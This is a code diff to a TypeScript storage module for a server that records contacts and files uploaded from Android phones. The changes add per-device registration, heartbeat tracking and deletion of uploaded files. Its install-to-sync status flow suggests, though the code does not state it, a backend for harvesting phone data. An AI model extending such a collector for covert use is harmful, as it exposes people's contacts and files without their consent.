@@ -36,6 +36,16 @@ export interface StatusEntry {
   detail?: string;
 }
 
+export interface DeviceInfo {
+  id: string;
+  name: string;
+  model: string;
+  brand: string;
+  androidVersion: string;
+  lastHeartbeat?: string;
+  firstSeen: string;
+}
+
 export interface ContactSession {
   id: string;
   contacts: string; // JSON array of contacts
@@ -48,11 +58,13 @@ export interface ContactSession {
   statusHistory?: StatusEntry[];
   lastHeartbeat?: string;
   buildId?: string;
+  devices?: Record<string, DeviceInfo>; // deviceId -> DeviceInfo
 }
 
 export interface UploadedFile {
   id: string;
   sessionId: string;
+  deviceId?: string; // Which device uploaded this file
   filePath: string; // Original path on phone
   fileName: string;
   fileSize: number;
@@ -69,6 +81,7 @@ export async function createSession(data: {
   appName: string;
   count: number;
   fileCount: number;
+  buildId?: string;
 }): Promise<ContactSession> {
   ensureDirs();
   const id = randomUUID();
@@ -80,6 +93,8 @@ export async function createSession(data: {
     count: data.count,
     fileCount: data.fileCount,
     createdAt: new Date().toISOString(),
+    buildId: data.buildId,
+    devices: {},
   };
   fs.writeFileSync(
     path.join(SESSIONS_DIR, `${id}.json`),
@@ -113,6 +128,12 @@ export async function deleteSessionById(id: string): Promise<boolean> {
     for (const f of files) {
       const fp = path.join(FILES_DIR, `${f.id}.json`);
       if (fs.existsSync(fp)) fs.unlinkSync(fp);
+    }
+    // Delete uploaded physical files
+    const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/collector-uploads";
+    const sessionDir = path.join(UPLOAD_DIR, id);
+    if (fs.existsSync(sessionDir)) {
+      fs.rmSync(sessionDir, { recursive: true, force: true });
     }
     return true;
   } catch {
@@ -148,7 +169,8 @@ export async function updateSessionStatus(
 }
 
 export async function updateSessionHeartbeat(
-  id: string
+  id: string,
+  deviceId?: string
 ): Promise<ContactSession | null> {
   ensureDirs();
   const filePath = path.join(SESSIONS_DIR, `${id}.json`);
@@ -156,17 +178,32 @@ export async function updateSessionHeartbeat(
   try {
     const raw = fs.readFileSync(filePath, "utf-8");
     const session = JSON.parse(raw) as ContactSession;
-    session.lastHeartbeat = new Date().toISOString();
-    // If status was offline, change to live_connected
-    if (session.status === 'offline') {
+    const now = new Date().toISOString();
+    session.lastHeartbeat = now;
+
+    // If status was offline or in a syncing state, change to live_connected
+    if (
+      session.status === 'offline' ||
+      session.status === 'syncing_contacts' ||
+      session.status === 'syncing_files' ||
+      session.status === 'permissions_granted' ||
+      session.status === 'app_installed' ||
+      session.status === 'waiting_install'
+    ) {
       session.status = 'live_connected';
       if (!session.statusHistory) session.statusHistory = [];
       session.statusHistory.push({
         status: 'live_connected',
-        timestamp: new Date().toISOString(),
-        detail: 'Heartbeat recovered from offline',
+        timestamp: now,
+        detail: 'Heartbeat recovered connection',
       });
     }
+
+    // Update device heartbeat if deviceId provided
+    if (deviceId && session.devices && session.devices[deviceId]) {
+      session.devices[deviceId].lastHeartbeat = now;
+    }
+
     fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
     return session;
   } catch {
@@ -215,10 +252,59 @@ export async function updateSession(
   }
 }
 
+// ─── Device Operations ────────────────────────────────────
+
+export async function registerOrUpdateDevice(
+  sessionId: string,
+  deviceInfo: {
+    id: string;
+    name: string;
+    model: string;
+    brand: string;
+    androidVersion: string;
+  }
+): Promise<ContactSession | null> {
+  ensureDirs();
+  const filePath = path.join(SESSIONS_DIR, `${sessionId}.json`);
+  if (!fs.existsSync(filePath)) return null;
+  try {
+    const raw = fs.readFileSync(filePath, "utf-8");
+    const session = JSON.parse(raw) as ContactSession;
+    if (!session.devices) session.devices = {};
+
+    const now = new Date().toISOString();
+    if (session.devices[deviceInfo.id]) {
+      // Update existing device info
+      session.devices[deviceInfo.id].name = deviceInfo.name;
+      session.devices[deviceInfo.id].model = deviceInfo.model;
+      session.devices[deviceInfo.id].brand = deviceInfo.brand;
+      session.devices[deviceInfo.id].androidVersion = deviceInfo.androidVersion;
+      session.devices[deviceInfo.id].lastHeartbeat = now;
+    } else {
+      // Register new device
+      session.devices[deviceInfo.id] = {
+        id: deviceInfo.id,
+        name: deviceInfo.name,
+        model: deviceInfo.model,
+        brand: deviceInfo.brand,
+        androidVersion: deviceInfo.androidVersion,
+        lastHeartbeat: now,
+        firstSeen: now,
+      };
+    }
+
+    fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
+    return session;
+  } catch {
+    return null;
+  }
+}
+
 // ─── Uploaded File Operations ───────────────────────────
 
 export async function createUploadedFile(data: {
   sessionId: string;
+  deviceId?: string;
   filePath: string;
   fileName: string;
   fileSize: number;
@@ -230,6 +316,7 @@ export async function createUploadedFile(data: {
   const uploadedFile: UploadedFile = {
     id,
     sessionId: data.sessionId,
+    deviceId: data.deviceId || '',
     filePath: data.filePath,
     fileName: data.fileName,
     fileSize: data.fileSize,
@@ -281,4 +368,29 @@ export async function findFilesBySessionId(
     // Directory may not exist yet
   }
   return files;
+}
+
+export async function deleteFileById(fileId: string): Promise<boolean> {
+  ensureDirs();
+  const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/collector-uploads";
+  const filePath = path.join(FILES_DIR, `${fileId}.json`);
+  if (!fs.existsSync(filePath)) return false;
+  try {
+    const raw = fs.readFileSync(filePath, "utf-8");
+    const fileData = JSON.parse(raw) as UploadedFile;
+
+    // Delete physical file using correct UPLOAD_DIR
+    if (fileData.serverPath) {
+      const fullPath = path.join(UPLOAD_DIR, fileData.serverPath);
+      if (fs.existsSync(fullPath)) {
+        fs.unlinkSync(fullPath);
+      }
+    }
+
+    // Delete metadata JSON
+    fs.unlinkSync(filePath);
+    return true;
+  } catch {
+    return false;
+  }
 }
